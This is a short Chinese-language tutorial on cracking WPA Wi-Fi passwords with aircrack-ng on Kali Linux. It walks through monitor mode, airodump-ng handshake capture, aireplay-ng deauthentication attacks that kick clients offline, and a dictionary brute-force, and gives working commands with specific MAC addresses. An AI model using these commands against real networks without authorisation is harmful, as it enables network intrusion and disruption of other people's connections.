# 无线攻击

## 配置

在无线安全测试中，最基础的就是要有一个无线网卡（无线适配器），最好是对Kali Linux免驱，也就是无线网卡在Kali Linux中是“即插即用”的，无需安装额外的驱动程序，Kali Linux能够自动识别并加载内置的该无线网卡的驱动程序。而不使用计算机自带的无线网卡的原因是：许多计算机自带的无线网卡不支持特定功能，或者其驱动程序在Linux环境中不支持这些功能，如监听模式（Monitor Mode）和包注入（Packet Injection）。

其次，无线安全测试中，主要使用的是`aircrack-ng`套件，确保已经安装（Kali Linux自带）。

## 侦察

首先在插入网卡，在虚拟机中，虚拟机-可移动设备中连接无线网卡。

使用`iwconfig`命令，查看网卡是否已经连接到Kali：

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/0536d6a3-c650-4e09-9e75-6d2605917d10/b16d4229-c630-418e-ae8f-0bb2483fdc36/image.png)

## 监控

使用`aircrack-ng` 套件的`airmon-ng wlan0`命令开启监控功能。

## 扫描

使用`aircrack-ng` 套件的`airodump-ng`命扫描所有无线网络

`airodump-ng wlan0mon`

当发现目标网络时，停止扫描，使用下面命令针对目标网络进行监控。

`airodump-ng -c 6 --bssid 90:B6:7A:53:38:BE -w /home/maktub/Desktop/handshake/CU-9y9c wlan0mon`

-c：无线接入点的网络信道

—bssid：无线接入点的MAC

-w：将扫描信息写入文件

在用户和无线接入点传递WPA密钥匙时，就可以抓到数据包了，这是一种被动等待方法，主动就需要像目标网络发起取消鉴定攻击，将目标网络客户端踢下线，在客户端重连时就可以抓到数据包了。

## 攻击

使用`aircrack-ng` 套件的`aireplay-ng`命令发起攻击

`aireplay-ng --deauth 100 -a 14:6B:9A:DD:7C:90 wlan0mon` 将目标网络所有客户端踢下线

`aireplay-ng -0 100 -a 30:42:40:81:9C:C6 -c 04:10:90:05:00:00 wlan0mon` 将特定客户端踢下线

一旦抓到数据包，就会在终端右上角显示WPA+无线接入点的MAC

## 破解

抓到数据包之后，就需要对数据包密钥进行暴力破解，这需要一个强有力的字典以及`aircrack-ng` 套件的`aircrack-ng`命令

`aircrack-ng -w '/home/maktub/Desktop/密码字典/0-9.8位纯数密码.txt' -b 90:B6:7A:53:38:BE /home/maktub/Desktop/handshake/CU-9y9c-01.cap`

-w：密码字典位置

-b：无线接入点的MAC

数据包的cap文件，支持通配符对多个cap文件进行匹配。